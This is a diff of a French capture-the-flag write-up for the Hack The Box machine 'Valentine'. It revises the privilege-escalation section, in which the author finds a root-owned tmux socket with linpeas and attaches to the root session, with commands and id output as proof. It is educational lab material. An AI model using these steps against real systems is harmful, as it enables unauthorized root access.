@@ -141,28 +141,52 @@ ssh -i hype_key_decrypted.pem hype@valentine.htb
 
 ---
 
-## 🚀 Escalade de privilèges
+## 🚀 Escalade de privilèges via tmux (root session)
 
-Une fois connecté en `hype`, on lance `linpeas.sh` :
-
-```bash
-./linpeas.sh
-```
-
-Ce dernier met en évidence une session `tmux` lancée en tant que root :
-
-```
-/usr/bin/tmux -S /.devs/dev_sess
-```
-
-On vérifie avec :
+Après avoir obtenu un shell SSH en tant que l’utilisateur `hype`, j’ai lancé un classique :
 
 ```bash
-ls -la /.devs/
+linpeas.sh
+```
+
+💡 **LinPEAS** a mis en évidence la présence d’un processus tmux tournant en tant que root, avec cette ligne intrigante :
+
+```bash
+root   1040  0.0  0.1  26416  1672 ?  Ss  01:24   0:00 /usr/bin/tmux -S /.devs/dev_sess
+```
+
+### 🧠 Analyse
+
+Le socket tmux (`-S /.devs/dev_sess`) est accessible (lecture/exécution) par l’utilisateur `hype`.
+
+Le processus appartient à `root`, ce qui signifie que la session associée pourrait être `root` attachée !
+
+### 🧪 Tentatives manuelles
+
+Liste des sessions disponibles :
+
+```bash
+tmux -S /.devs/dev_sess ls
+```
+
+Connexion à la session existante :
+
+```bash
 tmux -S /.devs/dev_sess attach
 ```
 
-Bingo : une session root est accessible.
+### ✅ Et là, bingo !
+
+J’ai accédé à une session interactive **root** encore ouverte. Probablement laissée là par un admin négligent, ou par un script de debug.
+
+### 📝 Preuve
+
+```
+root@Valentine:/# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
 
 ---
 
@@ -187,3 +211,8 @@ Cette machine montre l’impact réel d’une vulnérabilité critique comme Hea
 ---
 
 > 🎯 Entraîne-toi à automatiser ce type d’exploitation, et n’oublie jamais d’examiner les résultats de `linpeas` en détail !
+
+
+
+
+
